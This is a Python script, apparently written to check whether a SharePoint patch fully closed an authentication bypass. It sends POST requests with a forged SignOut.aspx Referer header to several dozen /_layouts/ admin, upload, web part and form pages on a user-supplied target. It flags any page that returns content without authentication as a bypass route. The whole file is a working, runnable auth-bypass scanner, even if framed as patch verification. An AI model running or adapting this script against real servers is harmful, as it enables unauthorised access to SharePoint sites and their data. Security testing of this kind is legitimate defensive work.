#!/usr/bin/env python3
"""
COVERAGE TEST: Comprehensive /_layouts/ endpoint testing with signout Referer

Hypothesis: The patch only blocks signout+ToolPane.aspx, but other /_layouts/
endpoints might have the SAME signout bypass vulnerability.

This test systematically enumerates ALL /_layouts/ endpoints and tests each
with signout Referer to identify unpatched bypass routes.
"""

import requests
import argparse

def test_endpoint_with_signout_referer(base_url, endpoint, method="POST", data="", description=""):
    """Test if endpoint is vulnerable to signout Referer bypass"""
    print(f"\n[*] Test: {description}")
    print(f"    Endpoint: {endpoint}")

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3",
        "Referer": "/_layouts/SignOut.aspx",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

    url = f"{base_url}{endpoint}"

    try:
        if method == "POST":
            response = requests.post(url, headers=headers, data=data, allow_redirects=False, timeout=10)
        else:
            response = requests.get(url, headers=headers, allow_redirects=False, timeout=10)

        status = response.status_code
        print(f"    Status: {status}")

        # Check for bypass indicators
        if status == 200:
            # Check if it's just a public page or actual bypass
            body_sample = response.text[:500].lower()
            if "401" not in body_sample and "unauthorized" not in body_sample:
                print(f"    [!] POTENTIAL BYPASS! 200 OK with content")
                print(f"    Body sample: {response.text[:200]}")
                return True
        elif status == 500:
            print(f"    [~] 500 Server Error - might indicate request was processed")
            print(f"    Body: {response.text[:200]}")
        elif status == 401:
            print(f"    [-] 401 Unauthorized - Auth required")
        elif status == 403:
            print(f"    [-] 403 Forbidden")
        elif status in [302, 301]:
            print(f"    [~] Redirect to: {response.headers.get('Location', 'N/A')}")
        elif status == 404:
            print(f"    [-] 404 Not Found")
        else:
            print(f"    [?] Unexpected: {status}")

        return False
    except Exception as e:
        print(f"    [!] Error: {str(e)[:80]}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Comprehensive /_layouts/ endpoint signout bypass testing")
    parser.add_argument("--url", required=True, help="Target SharePoint URL")
    args = parser.parse_args()

    base_url = args.url.rstrip('/')

    print("[*] COVERAGE TEST: Comprehensive /_layouts/ Endpoint Enumeration")
    print("[*] Testing ALL /_layouts/ endpoints with signout Referer bypass")
    print("=" * 80)

    # Comprehensive list of /_layouts/ endpoints from SharePoint
    # Organized by functional category

    potential_bypasses = []

    # 1. Tool and Admin Pages
    print("\n### Category 1: Tool and Admin Pages")
    tool_pages = [
        "/_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx",  # Known vulnerable (patched)
        "/_layouts/15/ToolPicker.aspx",
        "/_layouts/15/ToolPart.aspx",
        "/_layouts/15/AdminRecycleBin.aspx",
        "/_layouts/15/AdminTools.aspx",
        "/_layouts/15/Settings.aspx",
        "/_layouts/15/SiteSettings.aspx",
        "/_layouts/15/ManageFeatures.aspx",
        "/_layouts/15/ListEdit.aspx",
        "/_layouts/15/EditPrms.aspx",
        "/_layouts/15/Role.aspx",
        "/_layouts/15/User.aspx",
        "/_layouts/15/Groups.aspx",
    ]

    for endpoint in tool_pages:
        if test_endpoint_with_signout_referer(base_url, endpoint, method="POST", description=f"Tool page: {endpoint}"):
            potential_bypasses.append(endpoint)

    # 2. Web Part Pages
    print("\n### Category 2: Web Part Pages")
    webpart_pages = [
        "/_layouts/15/WebPartAdder.aspx",
        "/_layouts/15/WebPartGallery.aspx",
        "/_layouts/15/StorMan.aspx",
        "/_layouts/15/EditWebPart.aspx",
        "/_layouts/15/WPPicker.aspx",
        "/_layouts/15/AreaTemplateSettings.aspx",
        "/_layouts/15/AreaNavigationSettings.aspx",
        "/_layouts/15/AreaWelcomePage.aspx",
    ]

    for endpoint in webpart_pages:
        if test_endpoint_with_signout_referer(base_url, endpoint, method="POST", description=f"WebPart page: {endpoint}"):
            potential_bypasses.append(endpoint)

    # 3. Picker Pages (CVE-2019-0604 context)
    print("\n### Category 3: Picker Pages")
    picker_pages = [
        "/_layouts/15/Picker.aspx",
        "/_layouts/15/PickerDialog.aspx",
        "/_layouts/15/ItemPicker.aspx",
        "/_layouts/15/EntityPicker.aspx",
        "/_layouts/15/PeoplePicker.aspx",
    ]

    for endpoint in picker_pages:
        if test_endpoint_with_signout_referer(base_url, endpoint, method="POST", description=f"Picker page: {endpoint}"):
            potential_bypasses.append(endpoint)

    # 4. Form and Dialog Pages
    print("\n### Category 4: Form and Dialog Pages")
    form_pages = [
        "/_layouts/15/FormServer.aspx",
        "/_layouts/15/FormServerAttachments.aspx",
        "/_layouts/15/InfoPathForm.aspx",
        "/_layouts/15/DialogMaster.aspx",
        "/_layouts/15/SimpleForm.aspx",
        "/_layouts/15/FieldEdit.aspx",
        "/_layouts/15/FldNew.aspx",
    ]

    for endpoint in form_pages:
        if test_endpoint_with_signout_referer(base_url, endpoint, method="POST", description=f"Form page: {endpoint}"):
            potential_bypasses.append(endpoint)

    # 5. Upload and File Handler Pages
    print("\n### Category 5: Upload and File Handler Pages")
    upload_pages = [
        "/_layouts/15/Upload.aspx",
        "/_layouts/15/UploadEx.aspx",
        "/_layouts/15/UploadMultiple.aspx",
        "/_layouts/15/Download.aspx",
        "/_layouts/15/AttachFile.aspx",
    ]

    for endpoint in upload_pages:
        if test_endpoint_with_signout_referer(base_url, endpoint, method="POST", description=f"Upload page: {endpoint}"):
            potential_bypasses.append(endpoint)

    # 6. View and List Pages
    print("\n### Category 6: View and List Pages")
    view_pages = [
        "/_layouts/15/ViewType.aspx",
        "/_layouts/15/ViewEdit.aspx",
        "/_layouts/15/ViewNew.aspx",
        "/_layouts/15/ViewLsts.aspx",
        "/_layouts/15/ListFeed.aspx",
        "/_layouts/15/NewForm.aspx",
        "/_layouts/15/EditForm.aspx",
        "/_layouts/15/DispForm.aspx",
    ]

    for endpoint in view_pages:
        if test_endpoint_with_signout_referer(base_url, endpoint, method="POST", description=f"View page: {endpoint}"):
            potential_bypasses.append(endpoint)

    # 7. Quick Links Pages (from CVE-2020-1147 context)
    print("\n### Category 7: Quick Links Pages")
    quicklinks_pages = [
        "/_layouts/15/quicklinks.aspx",
        "/_layouts/15/quicklinksdialogform.aspx",
        "/_layouts/15/QuickLinksDialog.aspx",
        "/_layouts/15/ContactLinksSuggestionsMicroView.aspx",
    ]

    for endpoint in quicklinks_pages:
        if test_endpoint_with_signout_referer(base_url, endpoint, method="POST", description=f"QuickLinks page: {endpoint}"):
            potential_bypasses.append(endpoint)

    # 8. Other Potentially Vulnerable Pages
    print("\n### Category 8: Other Potentially Vulnerable Pages")
    other_pages = [
        "/_layouts/15/RedirectPage.aspx",
        "/_layouts/15/ActionRedirect.aspx",
        "/_layouts/15/ProfileRedirect.aspx",
        "/_layouts/15/downloadexternaldata.aspx",
        "/_layouts/15/MngSiteAdmin.aspx",
        "/_layouts/15/ManageContentType.aspx",
        "/_layouts/15/listedit.aspx",
        "/_layouts/15/CustomizePage.aspx",
    ]

    for endpoint in other_pages:
        if test_endpoint_with_signout_referer(base_url, endpoint, method="POST", description=f"Other page: {endpoint}"):
            potential_bypasses.append(endpoint)

    # Summary
    print("\n" + "=" * 80)
    print("[*] COVERAGE TEST COMPLETE")
    print(f"[*] Total endpoints tested: {len(tool_pages + webpart_pages + picker_pages + form_pages + upload_pages + view_pages + quicklinks_pages + other_pages)}")
    print(f"[*] Potential bypasses found: {len(potential_bypasses)}")

    if potential_bypasses:
        print("\n[!] POTENTIAL BYPASS ROUTES IDENTIFIED:")
        for endpoint in potential_bypasses:
            print(f"    - {endpoint}")
        print("\n[!] These endpoints returned 200 OK with signout Referer - requires manual verification")
    else:
        print("\n[+] No additional bypass routes found")
        print("[+] Patch appears to have addressed all /_layouts/ signout bypass routes")

if __name__ == "__main__":
    main()
